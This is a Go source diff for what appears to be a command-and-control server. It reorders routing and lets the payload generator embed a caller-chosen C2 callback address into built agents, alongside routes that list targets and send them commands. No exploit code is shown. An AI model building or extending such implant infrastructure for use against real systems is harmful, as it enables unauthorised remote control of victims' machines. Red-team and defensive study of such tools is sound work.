@@ -15,14 +15,14 @@ import (
 func SetupRoutes() *mux.Router {
 	r := mux.NewRouter()
 
-	// Static files (Web UI)
-	// r.PathPrefix("/").Handler(http.FileServer(http.Dir("./dashboard/dist")))
-
 	api := r.PathPrefix("/api").Subrouter()
 	api.Use(AuthMiddleware)
 	api.HandleFunc("/targets", getTargets).Methods("GET")
 	api.HandleFunc("/targets/{id}/command", sendCommand).Methods("POST")
 	api.HandleFunc("/payloads", generatePayload).Methods("POST")
+
+	// Static files (Web UI) - Handle after API routes
+	r.PathPrefix("/").Handler(http.FileServer(http.Dir("./dashboard/dist")))
 
 	return r
 }
@@ -78,12 +78,17 @@ func sendCommand(w http.ResponseWriter, r *http.Request) {
 
 func generatePayload(w http.ResponseWriter, r *http.Request) {
 	var data struct {
-		OS   string `json:"os"`
-		Arch string `json:"arch"`
+		OS     string `json:"os"`
+		Arch   string `json:"arch"`
+		C2Addr string `json:"c2_addr"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
 		http.Error(w, "Invalid request", 400)
 		return
+	}
+
+	if data.C2Addr == "" {
+		data.C2Addr = "localhost:5555" // Default fallback
 	}
 
 	filename := fmt.Sprintf("nomad_agent_%s_%s", data.OS, data.Arch)
@@ -92,7 +97,7 @@ func generatePayload(w http.ResponseWriter, r *http.Request) {
 	}
 	outputPath := filepath.Join("payloads", filename)
 
-	err := payload.BuildGoAgent(data.OS, data.Arch, r.Host, outputPath)
+	err := payload.BuildGoAgent(data.OS, data.Arch, data.C2Addr, outputPath)
 	if err != nil {
 		http.Error(w, err.Error(), 500)
 		return
